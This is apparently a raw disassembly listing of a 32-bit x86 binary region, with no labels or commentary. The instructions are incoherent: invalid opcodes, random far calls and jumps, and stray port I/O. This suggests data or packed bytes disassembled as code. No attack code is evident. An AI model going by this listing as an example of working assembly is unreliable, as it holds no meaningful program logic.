  417af7:	rcl    DWORD PTR [edi-0x2e85a3b],cl
  417afd:	sub    edi,DWORD PTR [ebx+eiz*2-0x4e]
  417b01:	cmp    eax,0xd5046553
  417b06:	sbb    eax,0x150b722e
  417b0b:	iret   
  417b0c:	sbb    DWORD PTR [ebx+0x1dc35ab0],eax
  417b12:	call   0xed5d:0x45045e4d
  417b19:	sub    esi,ebx
  417b1b:	pop    ebp
  417b1c:	jns    0x417b20
  417b1e:	or     cl,al
  417b20:	or     BYTE PTR [esi-0x39],dh
  417b23:	mov    al,ds:0x53a4d66
  417b28:	clc    
  417b29:	and    al,0xd1
  417b2b:	sti    
  417b2c:	cmp    al,0x95
  417b2e:	call   0xd727:0x8fcbb07
  417b35:	inc    ebx
  417b36:	popf   
  417b37:	cmc    
  417b38:	push   esi
  417b39:	or     BYTE PTR [eax-0x1],bh
  417b3c:	add    DWORD PTR [esi-0x75],ebx
  417b3f:	outs   dx,DWORD PTR ds:[esi]
  417b40:	or     eax,esi
  417b42:	mov    ?,WORD PTR [ebx+0x69860668]
  417b48:	mov    dl,0xd5
  417b4a:	test   al,0xb8
  417b4c:	out    0x9f,al
  417b4e:	cmc    
  417b4f:	bound  esi,QWORD PTR [edx-0x5e129252]
  417b55:	and    BYTE PTR [esi-0x6ef48916],0x68
  417b5c:	in     eax,0xa2
  417b5e:	inc    ebp
  417b5f:	pop    esi
  417b60:	xchg   edi,eax
  417b61:	xor    ebx,DWORD PTR [edx+0x26849441]
  417b67:	dec    esp
  417b68:	cdq    
  417b69:	inc    esp
  417b6a:	and    eax,0xa0e8bebb
  417b6f:	cmp    DWORD PTR [esi+0x732a2d0b],esp
  417b75:	add    eax,esp
  417b77:	inc    ecx
  417b78:	mov    dl,0xfa
  417b7a:	(bad)  
  417b7b:	jle    0x417b48
  417b7d:	out    dx,eax
  417b7e:	jno    0x417b12
  417b80:	jno    0x417b8d
  417b82:	in     al,0x89
  417b84:	inc    esp
  417b85:	mov    al,0xc4
  417b87:	into   
  417b88:	mov    esp,0xbb5c91f1
  417b8d:	js     0x417bd1
  417b8f:	daa    
  417b90:	pop    es
  417b91:	xchg   edi,eax
  417b92:	lds    ebp,FWORD PTR ds:0x5d0b24
  417b98:	iret   
  417b99:	push   ss
  417b9a:	jne    0x417c14
  417b9c:	jmp    0xcb061649
  417ba1:	fadd   DWORD PTR [edx+edi*8]
  417ba4:	imul   ebp,DWORD PTR [edx-0xd],0x535159a6
  417bab:	imul   ebp,DWORD PTR [edx+0x4c],0x46
  417baf:	imul   ebx,DWORD PTR [ebx-0x15],0xffffff86
  417bb3:	ja     0x417b98
  417bb5:	test   al,0x22
  417bb7:	rol    ah,cl
  417bb9:	dec    edi
  417bba:	popf   
  417bbb:	into   
  417bbc:	dec    esp
  417bbd:	ins    DWORD PTR es:[edi],dx
  417bbe:	ret    0xfc95
  417bc1:	add    al,0xb3
  417bc3:	jns    0x417bb7
  417bc5:	popa   
  417bc6:	mov    al,ds:0x53f1695e
  417bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bcc:	loopne 0x417c4d
  417bce:	je     0x417b87
  417bd0:	(bad)  
  417bd1:	xchg   esi,eax
  417bd2:	adc    eax,0x712ab28f
  417bd7:	mov    ebx,0x5c777a2b
  417bdc:	ror    DWORD PTR [ebx],0xcf
  417bdf:	and    al,0x92
  417be1:	repnz xchg ebx,eax
  417be3:	push   edx
  417be4:	(bad)  
  417be5:	stos   DWORD PTR es:[edi],eax
  417be6:	jecxz  0x417bfe
  417be8:	scas   al,BYTE PTR es:[edi]
  417be9:	iret   
  417bea:	jg     0x417c30
  417bec:	iret   
  417bed:	adc    al,0xda
  417bef:	dec    ebp
  417bf0:	bnd ja 0x417b7a
  417bf3:	mov    BYTE PTR cs:[ecx],cl
  417bf6:	daa    
  417bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf8:	lock cli 
  417bfa:	test   BYTE PTR [edi-0x3c06a517],dl
  417c00:	mov    dl,0xae
  417c02:	fstp   st(0)
  417c04:	iret   
  417c05:	jae    0x417bd8
  417c07:	icebp  
  417c08:	dec    edi
  417c09:	or     ebp,DWORD PTR [esi]
  417c0b:	call   0x5425:0xd92f4327
  417c12:	jp     0x417bc7
  417c14:	enter  0x997c,0xe4
  417c18:	cld    
  417c19:	xor    BYTE PTR [ebx-0x61],dl
  417c1c:	or     al,0xe7
  417c1e:	sbb    al,BYTE PTR [ebx-0x56868997]
  417c24:	repz and cl,dl
  417c27:	push   cs
  417c28:	jb     0x417ca4
  417c2a:	sub    BYTE PTR [edx-0x7f6512bb],cl
  417c30:	inc    edx
  417c31:	cmp    eax,edx
  417c33:	pop    ss
  417c34:	jecxz  0x417c43
  417c36:	cmp    BYTE PTR [eax+0x2ecc9f3],ah
  417c3c:	sbb    ch,bl
  417c3e:	xor    al,0xaa
  417c40:	fwait
  417c41:	xchg   edx,eax
  417c42:	call   0xebb9:0xcaa0f7e
  417c49:	add    esp,ebx
  417c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4c:	inc    esp
  417c4d:	neg    DWORD PTR [eax+esi*2+0x4fc5a195]
  417c54:	mov    esp,0xe4a427dd
  417c59:	mov    ecx,DWORD PTR [eax-0x6]
  417c5c:	shl    DWORD PTR [eax+ebp*4+0x2021eaa7],cl
  417c63:	or     ch,bl
  417c65:	adc    ebp,DWORD PTR [esi+ecx*4]
  417c68:	mov    dl,0x72
  417c6a:	adc    eax,0xee8958c0
  417c6f:	add    BYTE PTR [ebp+esi*8-0x46ce5883],bl
  417c76:	test   eax,0x69716604
  417c7b:	loope  0x417c39
  417c7d:	and    DWORD PTR ss:[eax],0x7cac8b99
  417c84:	jmp    0x28e89207
  417c89:	add    BYTE PTR [ebp-0x69],cl
  417c8c:	dec    ebx
  417c8d:	lods   al,BYTE PTR ds:[esi]
  417c8e:	retf   
  417c8f:	inc    esp
  417c90:	mov    dl,0xef
  417c92:	sub    dh,0xff
  417c95:	(bad)  
  417c96:	jne    0x417cd7
  417c98:	jl     0x417ca5
  417c9a:	sub    BYTE PTR ds:0x96783827,0x1a
  417ca1:	cmp    DWORD PTR [edx-0x66559d36],ebx
  417ca7:	fucom  st(7)
  417ca9:	push   0x50
  417cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cac:	test   al,0x19
  417cae:	push   edi
  417caf:	cmp    eax,0x92c32d77
  417cb4:	mov    dl,0xff
  417cb6:	cwde   
  417cb7:	je     0x417c5a
  417cb9:	sbb    eax,0x166bdb5b
  417cbe:	add    DWORD PTR [ebp+0x3bb6087d],0x2049ae10
  417cc8:	adc    dh,BYTE PTR [ebp+eiz*1+0x8]
  417ccc:	mov    bl,0x2
  417cce:	cli    
  417ccf:	dec    edi
  417cd0:	mov    al,bl
  417cd2:	jl     0x417c98
  417cd4:	repnz cmc 
  417cd6:	shl    BYTE PTR [edi],1
  417cd8:	or     BYTE PTR [ebx],0xd2
  417cdb:	je     0x417d21
  417cdd:	pop    ds
  417cde:	(bad)  
  417cdf:	push   cs
  417ce0:	gs call 0x2ce1:0xe404
  417ce7:	mov    ch,0xbe
  417ce9:	pop    ss
  417cea:	mov    ecx,0xab116ba7
  417cef:	popf   
  417cf0:	int3   
  417cf1:	nop
  417cf2:	test   BYTE PTR [edx+esi*4+0x17c74ab4],ch
  417cf9:	mov    DWORD PTR [ecx],ebp
  417cfb:	jp     0x417cf8
  417cfd:	add    al,0xe3
  417cff:	cs ds in eax,0xdb
  417d03:	int    0x1b
  417d05:	out    dx,eax
  417d06:	clc    
  417d07:	inc    ebx
  417d08:	mov    ch,0x17
  417d0a:	xchg   ebp,eax
  417d0b:	or     al,0xe3
  417d0d:	pushf  
  417d0e:	test   eax,0xe9058767
  417d13:	push   0x5c2f3695
  417d18:	(bad)
  417d1c:	aad    0xa7
  417d1e:	mov    bl,0x8
  417d20:	xor    ebx,DWORD PTR ds:0xe55a082c
  417d26:	test   al,0xa7
  417d28:	inc    eax
  417d29:	inc    esp
  417d2a:	xor    BYTE PTR [edi+0x3cfde62f],bh
  417d30:	mov    bl,0x60
  417d32:	xchg   ebp,eax
  417d33:	out    0x10,eax
  417d35:	push   0xf36e3678
  417d3a:	add    al,0xa2
  417d3c:	push   edx
  417d3d:	inc    edi
  417d3e:	xchg   esi,eax
  417d3f:	aam    0x70
  417d41:	retf   
  417d42:	mov    ds:0x84ff3599,eax
  417d47:	mov    ebp,0xde1a17d6
  417d4c:	mov    ebx,0xaa6650f7
  417d51:	or     ebx,DWORD PTR [eax-0xd]
  417d54:	fild   QWORD PTR ds:0x3902f227
  417d5a:	call   0xa82d:0x7a3bc1a2
  417d61:	lds    edi,FWORD PTR [ecx-0x1f77775a]
  417d67:	dec    eax
  417d68:	sbb    ch,BYTE PTR [edi+0x2c]
  417d6b:	jg     0x417d7f
  417d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6e:	call   0x9f90:0x28604e67
  417d75:	test   cl,0xa7
  417d78:	int3   
  417d79:	std    
  417d7a:	xor    bh,dl
  417d7c:	dec    ebx
  417d7d:	jmp    0x6338:0xd7b2f68d
  417d84:	mov    esp,0x5b3fed97
  417d89:	jnp    0x417d69
  417d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d8c:	xchg   esp,eax
  417d8d:	pushf  
  417d8e:	sub    BYTE PTR [ebp+0x28],0x37
  417d92:	mov    eax,ds:0x9a47488f
  417d97:	mov    ebx,0xc0893c60
  417d9c:	xor    eax,0x7f4b8c39
  417da1:	or     esp,DWORD PTR [edx-0x4b]
  417da4:	in     al,0x14
  417da6:	pop    edi
  417da7:	mov    edi,0xa99a8209
  417dac:	cmp    DWORD PTR [ebx],ebp
  417dae:	mov    ah,BYTE PTR [eax-0x585474f3]
  417db4:	pop    ds
  417db5:	shl    DWORD PTR [ecx+0x59257ccb],0x13
  417dbc:	mov    dl,0xfb
  417dbe:	mov    edi,0xd9d4b632
  417dc3:	pop    edx
  417dc4:	idiv   edi
  417dc6:	inc    ecx
  417dc7:	mov    eax,0xa7278577
  417dcc:	fcomip st,st(4)
  417dce:	out    0xa2,eax
  417dd0:	mov    eax,0xa3a498e4
  417dd5:	push   ds
  417dd6:	or     BYTE PTR [edx-0x2cc614f7],ch
  417ddc:	pop    ds
  417ddd:	add    eax,0x1f34e6f1
  417de2:	call   0xb2c3:0xd636ede9
  417de9:	cmc    
  417dea:	jle    0x417e5d
  417dec:	pop    ss
  417ded:	xlat   BYTE PTR ds:[ebx]
  417dee:	dec    ebx
  417def:	jp     0x417dff
  417df1:	or     esi,ebx
  417df3:	shr    al,1
  417df5:	push   es
  417df6:	and    al,0x8c
  417df8:	mov    ebp,0x69209a5d
  417dfd:	popf   
  417dfe:	cli    
  417dff:	mov    edi,0xa76d75ca
  417e04:	add    al,0xb8
  417e06:	test   DWORD PTR [ecx],edi
  417e08:	outs   dx,DWORD PTR ds:[esi]
  417e09:	stos   DWORD PTR es:[edi],eax
  417e0a:	jnp    0x417e4e
  417e0c:	mov    ch,0x7a
  417e0e:	sbb    eax,0xa86dbb0
  417e13:	xchg   ebx,eax
  417e14:	xchg   DWORD PTR [eax+ebx*1-0x2ab64e59],eax
  417e1b:	or     ecx,0x17
  417e1e:	xchg   ecx,eax
  417e1f:	clc    
  417e20:	mov    dl,0x72
  417e22:	xor    DWORD PTR [ecx+0x7e5d556d],edx
  417e28:	add    DWORD PTR [edx],0xffffffa9
  417e2b:	in     eax,0xd2
  417e2d:	pusha  
  417e2e:	call   0xb203:0x1030280b
  417e35:	jns    0x417e93
  417e37:	(bad)  
  417e38:	jl     0x417e59
  417e3a:	or     BYTE PTR [ecx+0x50],0xb
  417e3e:	push   cs
  417e3f:	pop    edx
  417e40:	stc    
  417e41:	out    0xc5,al
  417e43:	cmp    esp,DWORD PTR [eax+edi*2]
  417e46:	jb     0x417e02
  417e48:	lods   al,BYTE PTR ds:[esi]
  417e49:	int    0x1b
  417e4b:	or     ah,BYTE PTR [esi-0x60]
  417e4e:	jge    0x417df8
  417e50:	xor    al,0x93
  417e52:	mov    esp,0x6f0d0e67
  417e57:	push   ds
  417e58:	int3   
  417e59:	or     edi,DWORD PTR [esi+0xf578e92]
  417e5f:	cwde   
  417e60:	outs   dx,DWORD PTR ds:[esi]
  417e61:	jno    0x417dfd
  417e63:	(bad)  
  417e65:	inc    esi
  417e66:	adc    eax,0xfa40f2c4
  417e6b:	mov    cl,0xe9
  417e6d:	clc    
  417e6e:	mov    eax,ds:0x3cfb5ca5
  417e73:	jp     0x417ee7
  417e75:	neg    DWORD PTR [edi+0x43]
  417e78:	mov    DWORD PTR [esi+0x4d],edx
  417e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e7c:	or     eax,0x11007b9e
  417e81:	(bad)  
  417e82:	sbb    ah,BYTE PTR [edi+0x684559c2]
  417e88:	je     0x417efe
  417e8a:	xchg   ebx,eax
  417e8b:	gs mov ebx,0x2f93dc88
  417e91:	or     ebp,edi
  417e93:	push   cs
  417e94:	adc    al,0x66
  417e96:	push   esp
  417e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e98:	mov    bl,0x39
  417e9a:	sbb    dh,BYTE PTR [ecx+0x6b]
  417e9d:	push   esp
  417e9e:	sub    bl,0xb8
  417ea1:	(bad)  
  417ea2:	ins    DWORD PTR es:[edi],dx
  417ea3:	test   cl,ch
  417ea5:	fwait
  417ea6:	fwait
  417ea7:	pop    edx
  417ea8:	repz repnz dec edi
  417eab:	into   
  417eac:	outs   dx,BYTE PTR ds:[esi]
  417ead:	icebp  
  417eae:	loopne 0x417e87
  417eb0:	clc    
  417eb1:	or     edx,DWORD PTR [eax+esi*4-0x6fc900be]
  417eb8:	mov    al,0x72
  417eba:	call   0x26b4:0x673532f7
  417ec1:	sub    al,0x3e
  417ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ec4:	scas   eax,DWORD PTR es:[edi]
  417ec5:	cdq    
  417ec6:	mov    esp,0x48c5c719
  417ecb:	mov    ecx,DWORD PTR [edx+esi*4-0x31dadb15]
  417ed2:	and    eax,0xfdb334ca
  417ed7:	jns    0x417f4c
  417ed9:	or     ecx,DWORD PTR [ecx+0x4f]
  417edc:	jle    0x417f3f
  417ede:	shr    BYTE PTR [eax-0x24],1
  417ee1:	out    dx,eax
  417ee2:	loop   0x417ec6
  417ee4:	mov    dl,0x48
  417ee6:	pop    ss
  417ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ee8:	sub    dl,BYTE PTR [esi+ebx*8+0x480b5290]
  417eef:	or     DWORD PTR [ebp+edx*2+0x4],ebx
  417ef3:	sbb    al,0x19
  417ef5:	cmc    
  417ef6:	cdq    
  417ef7:	mov    dh,0xdb
  417ef9:	sub    al,0xf4
  417efb:	xchg   edi,eax
  417efc:	and    eax,0x4e90fad2
  417f01:	aam    0xe0
  417f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f04:	sub    dl,dh
  417f06:	rcr    DWORD PTR [eax+0x1e],cl
  417f09:	xor    BYTE PTR [edi+0x14],dh
  417f0c:	(bad)  
  417f0d:	mov    dl,0x99
  417f0f:	imul   esi,ebx,0xffffffef
  417f12:	addr16 add ebx,ebx
  417f15:	retf   
  417f16:	xor    eax,0x500b38a0
  417f1b:	push   ebp
  417f1c:	popf   
  417f1d:	and    eax,0xb4d7bd55
  417f22:	call   0x4939:0x2a001de
  417f29:	jle    0x417f5d
  417f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2c:	pop    ebp
  417f2d:	test   al,0xf7
  417f2f:	je     0x417ed6
  417f31:	xchg   DWORD PTR [ebp+0x62],esp
  417f34:	enter  0xe22e,0x6
  417f38:	mov    dl,0xd7
  417f3a:	and    eax,0x81adf593
  417f3f:	fmul   st(0),st
  417f41:	or     esi,DWORD PTR [eax-0x30]
  417f44:	mov    edx,0x2cf7deff
  417f49:	sbb    ebx,DWORD PTR [ebp+0x43d62b27]
  417f4f:	sbb    DWORD PTR [edx+0x6],esi
  417f52:	shl    BYTE PTR [edi+0x4c],1
  417f55:	clc    
  417f56:	mov    edx,0xbd0b4719
  417f5b:	std    
  417f5c:	xchg   esi,eax
  417f5d:	xor    ecx,DWORD PTR [edx]
  417f5f:	mov    ebp,DWORD PTR ds:0xe5909895
  417f65:	fldenv [ebp+0x67]
  417f68:	push   ds
  417f69:	call   0xcae7fef4
  417f6e:	popf   
  417f6f:	mov    ds:0x50c75d5a,al
  417f74:	xchg   esp,eax
  417f75:	mov    eax,DWORD PTR [esi]
  417f77:	mov    ds:0xdcd60013,eax
  417f7c:	sbb    DWORD PTR [ebx],ecx
  417f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f7f:	mov    ch,0x78
  417f81:	fistp  DWORD PTR [eax-0x30]
  417f84:	adc    cl,BYTE PTR [ebx]
  417f86:	mov    DWORD PTR [eax+esi*4+0x15301a2b],edx
  417f8d:	and    ebx,DWORD PTR [edx+0x68eece67]
  417f93:	pop    ebp
  417f94:	mov    ebx,0x2a6d070
  417f99:	jge    0x418001
  417f9b:	outs   dx,DWORD PTR ds:[esi]
  417f9c:	and    DWORD PTR [eax+0x5a4f7720],ebp
  417fa2:	fwait
  417fa3:	adc    BYTE PTR [edi-0x2967228d],bh
  417fa9:	ss jle 0x417f61
  417fac:	pop    esi
  417fad:	or     ebx,esp
  417faf:	xchg   ebp,eax
  417fb0:	mov    dh,0xc6
  417fb2:	xor    esi,DWORD PTR [edx]
  417fb4:	ds int 0x9a
  417fb7:	fidiv  WORD PTR [esi+0x69]
  417fba:	fdivr  DWORD PTR [edi]
  417fbc:	mov    eax,ds:0x6e9ca784
  417fc1:	inc    edi
  417fc2:	push   ds
  417fc3:	outs   dx,BYTE PTR ds:[esi]
  417fc4:	aas    
  417fc5:	cmp    eax,0x26da2707
  417fca:	popa   
  417fcb:	shl    BYTE PTR [ebx+0x784d4395],1
  417fd1:	fsub   DWORD PTR [ecx+0x6d285a70]
  417fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd8:	pop    ebp
  417fd9:	(bad)  
  417fdb:	inc    ebp
  417fdc:	aas    
  417fdd:	jbe    0x417ff5
  417fdf:	(bad)  
  417fe0:	mov    dl,0x8c
  417fe2:	leave  
  417fe3:	retf   
  417fe4:	add    BYTE PTR [ebp+0x7eae07d8],0x15
  417feb:	mov    ds:0x56f052c,eax
  417ff0:	mov    edx,0x26bd688b
  417ff5:	jmp    0x3e22:0xc8014498
  417ffc:	pop    ecx
  417ffd:	imul   ebp,DWORD PTR [edi+0x3c6ccdc7],0x430cc6a7
  418007:	retf   
  418008:	xchg   esp,eax
  418009:	or     cl,ah
  41800b:	fbstp  TBYTE PTR [ebx+0x5e09f5a7]
  418011:	mov    esp,0x6be882c1
  418017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418018:	outs   dx,DWORD PTR ds:[esi]
  418019:	dec    edx
  41801a:	call   DWORD PTR ds:0x72e3d43e
  418020:	mov    dl,0x24
  418022:	dec    esi
  418023:	sbb    al,BYTE PTR [edx+0x40f100fc]
  418029:	or     BYTE PTR [ecx-0x7e11b849],bl
  41802f:	fbstp  TBYTE PTR [edx]
  418031:	cmp    BYTE PTR [esi],0xb4
  418034:	mov    ebx,DWORD PTR [ebx+0x4e00a7ed]
  41803a:	dec    ecx
  41803b:	jg     0x418099
  41803d:	inc    ebx
  41803e:	jmp    DWORD PTR [edi+0x7d228f34]
  418044:	adc    BYTE PTR [edx+edi*4-0x18b4dd3],ch
  41804b:	ds pop eax
  41804d:	mov    dl,0x94
  41804f:	sub    ch,BYTE PTR [esi+0x5]
  418052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418053:	sbb    BYTE PTR [ecx-0x19e525c7],al
  418059:	call   0xaff:0xa3b25f51
  418060:	add    DWORD PTR [edx],eax
  418062:	xchg   esp,eax
  418063:	or     al,0xe1
  418065:	or     esp,ebx
  418067:	nop
  418068:	cli    
  418069:	cdq    
  41806a:	call   0x9a61a9ad
  41806f:	loop   0x4180ce
  418071:	mov    esi,edx
  418073:	jo     0x4180a4
  418075:	je     0x418062
  418077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418078:	cmc    
  418079:	inc    esp
  41807a:	cmp    bh,BYTE PTR [eax-0x511deafb]
  418080:	mov    ebp,DWORD PTR [esi-0xe4958ab]
  418086:	scas   eax,DWORD PTR es:[edi]
  418087:	inc    ebp
  418088:	hlt    
  418089:	pusha  
  41808a:	add    BYTE PTR [eax-0x2ef9d8b],ah
  418090:	fcomp  QWORD PTR [ebx]
  418092:	cs cdq 
  418094:	int    0x18
  418096:	call   0x6ce7:0x20af1dbe
  41809d:	cmp    eax,0x2192a70d
  4180a2:	popa   
  4180a3:	cmp    bh,BYTE PTR [eax]
  4180a5:	repnz add DWORD PTR [esi-0x4e],esi
  4180a9:	mov    esp,0x7334244e
  4180ae:	mul    BYTE PTR [edi-0x2c]
  4180b1:	xor    ebp,esi
  4180b3:	dec    esp
  4180b4:	mov    dl,0x29
  4180b6:	ror    BYTE PTR [ebx+0x27c8eab7],1
  4180bc:	lds    edi,FWORD PTR [esi]
  4180be:	call   0x920e:0xcf6677b0
  4180c5:	jnp    0x418109
  4180c7:	aaa    
  4180c8:	adc    cl,BYTE PTR [ebx]
  4180ca:	int3   
  4180cb:	jmp    0x418078
  4180cd:	push   esp
  4180ce:	cmp    eax,0x9a765236
  4180d3:	sbb    BYTE PTR [edi],dl
  4180d5:	das    
  4180d6:	xchg   esi,eax
  4180d7:	outs   dx,BYTE PTR ds:[esi]
  4180d8:	js     0x4180a5
  4180da:	mov    ecx,0xf763f6a7
  4180df:	pop    edx
  4180e0:	jns    0x4180cf
  4180e2:	mov    eax,ds:0x8f698247
  4180e7:	cmp    eax,0xa77bc55b
  4180ec:	out    dx,eax
  4180ed:	fld    DWORD PTR [ecx+0x4d]
  4180f0:	loop   0x41810f
  4180f2:	idiv   BYTE PTR [ebx]
  4180f4:	mov    dh,0x77
  4180f6:	push   ss
  4180f7:	or     eax,0x1d1a2c2a
  4180fc:	scas   eax,DWORD PTR es:[edi]
  4180fd:	cli    
  4180fe:	and    ah,BYTE PTR [esi-0x313cb501]
  418104:	ss mov al,0x56
  418107:	xchg   edi,eax
  418108:	push   esi
  418109:	sbb    al,0xe0
  41810b:	aaa    
  41810c:	mov    edi,esi
  41810e:	push   esp
  41810f:	fdiv   DWORD PTR [edx-0x136056df]
  418115:	mov    eax,ds:0xb56916d
  41811a:	mov    dh,0x8e
  41811c:	nop
  41811d:	inc    esp
  41811e:	test   eax,ecx
  418120:	and    eax,0xcb9a9abc
  418125:	cli    
  418126:	xor    DWORD PTR [ebp+0x77],edi
  418129:	ret    
  41812a:	xchg   BYTE PTR [edi-0x1fc2544d],ah
  418130:	loopne 0x418125
  418132:	or     edi,DWORD PTR [edx+esi*4+0x60]
  418136:	mov    bl,0xe2
  418138:	test   BYTE PTR [ebp+0xb354160],al
  41813e:	adc    DWORD PTR [edx],ecx
  418140:	mov    ebx,0x7f40351e
  418145:	in     eax,0x9d
  418147:	adc    al,0x51
  418149:	dec    eax
  41814a:	xor    ecx,ebx
  41814c:	ret    0xffe6
  41814f:	mov    edi,0xa93c3149
  418154:	xor    dh,cl
  418156:	enter  0xa37b,0x58
  41815a:	int3   
  41815b:	mov    al,0xb2
  41815d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41815e:	push   edi
  41815f:	ffree  st(6)
  418161:	xor    edx,esi
  418163:	or     dh,bl
  418165:	add    al,0x87
  418167:	push   ecx
  418168:	cwde   
  418169:	pop    edx
  41816a:	cmp    esi,DWORD PTR [ebx+0x61]
  41816d:	inc    esp
  41816e:	test   DWORD PTR [ebx-0x6a],0xf9229a7c
  418175:	test   DWORD PTR [edi-0x78],ebx
  418178:	arpl   WORD PTR [ecx-0xb],bx
  41817b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41817c:	pop    ebx
  41817d:	mov    cl,0x28
  41817f:	popf   
  418180:	add    al,0xcb
  418182:	ins    BYTE PTR es:[edi],dx
  418183:	add    DWORD PTR [ebp+0x7314b78f],ebp
  418189:	aas    
  41818a:	loop   0x4181a2
  41818c:	clc    
  41818d:	adc    eax,0x19c65762
  418192:	jae    0x418179
  418194:	mov    edi,0x2d43300b
  418199:	lock adc ch,BYTE PTR [ebp+0x13]
  41819d:	xor    BYTE PTR [edx+0x72],0xff
  4181a1:	fild   QWORD PTR [edi-0x7b]
  4181a4:	mov    ?,WORD PTR [ebx]
  4181a6:	or     eax,0x9dbc9ab0
  4181ab:	sub    eax,DWORD PTR [eax+ebp*1-0x76]
  4181af:	pop    ebp
  4181b0:	call   0xbe8bdf0
  4181b5:	sbb    DWORD PTR [edx+0x35],ebx
  4181b8:	lods   al,BYTE PTR ds:[esi]
  4181b9:	or     eax,0x4db2fc21
  4181be:	sbb    dl,ah
  4181c0:	jbe    0x41819a
  4181c2:	fmul   DWORD PTR [ecx+0x11]
  4181c5:	or     esp,DWORD PTR [ebx]
  4181c7:	mov    DWORD PTR [edi],ebx
  4181c9:	(bad)  
  4181ca:	popf   
  4181cb:	add    al,bl
  4181cd:	(bad)  
  4181ce:	fwait
  4181cf:	loopne 0x4181db
  4181d1:	add    DWORD PTR [ebp+0x66a92bd4],edx
  4181d7:	push   0xffffffd8
  4181d9:	or     esp,DWORD PTR [esi-0x5b]
  4181dc:	call   0x8da6034d
  4181e1:	dec    ebx
  4181e2:	xchg   BYTE PTR [ecx],ah
  4181e4:	(bad)  
  4181e6:	pop    edx
  4181e7:	sub    bl,BYTE PTR [ebp+0x11]
  4181ea:	xchg   esp,eax
  4181eb:	adc    eax,0x89f10a77
  4181f0:	pop    ebx
  4181f1:	cmp    edx,DWORD PTR [ebp+0x6e]
  4181f4:	retf   
  4181f5:	jp     0x41826c
  4181f7:	dec    ebx
  4181f8:	dec    ebx
  4181f9:	jo     0x418195
  4181fb:	xor    al,BYTE PTR [esi+0x1]
  4181fe:	add    ch,BYTE PTR [edx]
  418200:	dec    ecx
  418201:	jnp    0x4181e8
  418203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418204:	or     dh,0x93
  418207:	mov    edi,0xd2297a3
  41820c:	mov    dl,0x80
  41820e:	mov    bh,0x12
  418210:	xchg   ebp,eax
  418211:	cmp    DWORD PTR [edx],eax
  418213:	push   es
  418214:	gs or  edi,ecx
  418217:	in     eax,dx
  418218:	fmul   QWORD PTR [ecx]
  41821a:	mov    dl,0x83
  41821c:	add    al,0x5e
  41821e:	call   0xce78:0x769455ae
  418225:	pushf  
  418226:	in     al,0xa4
  418228:	pop    ebp
  418229:	ins    DWORD PTR es:[edi],dx
  41822a:	dec    esp
  41822b:	iret   
  41822c:	mov    ecx,0x54155236
  418231:	inc    edx
  418232:	xchg   ebx,eax
  418233:	cld    
  418234:	fdivrp st(7),st
  418236:	xlat   BYTE PTR ds:[ebx]
  418237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418238:	mov    eax,ds:0xef5634b8
  41823d:	or     edx,DWORD PTR [ecx-0x71aa87ca]
  418243:	ins    BYTE PTR es:[edi],dx
  418244:	int    0x91
  418246:	mov    eax,ds:0x4e047afb
  41824b:	scas   eax,DWORD PTR es:[edi]
  41824c:	(bad)  [ebx]
  41824e:	cmp    eax,0x94f56a5a
  418253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418254:	inc    esp
  418255:	cs mov esp,0x5760de7d
  41825b:	or     BYTE PTR [edx-0x6e54dc05],dh
  418261:	bound  eax,QWORD PTR [esi-0x14]
  418264:	(bad)  
  418265:	or     esi,DWORD PTR [ecx+0x5b]
  418268:	xor    BYTE PTR [ebp+0x7d],al
  41826b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41826c:	fs into 
  41826e:	call   0x97b7:0xc8529f9d
  418275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418276:	pusha  
  418277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418278:	fcom   DWORD PTR [eax+0x3]
  41827b:	inc    esi
  41827c:	outs   dx,DWORD PTR ds:[esi]
  41827d:	shl    BYTE PTR [edx],0xc5
  418280:	dec    ebp
  418281:	(bad)  
  418282:	call   0x41b5:0xc69cc439
  418289:	(bad)  
  41828b:	lahf   
  41828c:	push   ecx
  41828d:	lock sbb bl,BYTE PTR [esi]
  418290:	mov    ah,0xad
  418292:	xchg   ebp,eax
  418293:	xor    al,0xef
  418295:	jns    0x418231
  418297:	mov    ecx,gs
  418299:	ja     0x418271
  41829b:	retf   0xe89
  41829e:	push   es
  41829f:	adc    BYTE PTR [edi-0x79d28542],0x17
  4182a6:	call   0x9b84:0x809af28a
  4182ad:	sub    eax,0xadfca7e8
  4182b2:	mov    ebp,0xa889fd6b
  4182b7:	fidiv  WORD PTR [edx+0x4c1bb11c]
  4182bd:	das    
  4182be:	mov    BYTE PTR [edx],bl
  4182c0:	mov    bh,0xb
  4182c2:	(bad)  [ebx]
  4182c4:	inc    esi
  4182c5:	imul   BYTE PTR [edi-0x652fb783]
  4182cb:	jnp    0x4182b3
  4182cd:	sahf   
  4182ce:	sbb    BYTE PTR [esi-0x58dc2562],0x70
  4182d5:	test   eax,0x7995b527
  4182da:	push   edi
  4182db:	sub    DWORD PTR [ebp+0x62ff3157],esi
  4182e1:	jg     0x41828d
  4182e3:	inc    ecx
  4182e4:	fisubr DWORD PTR [ebx]
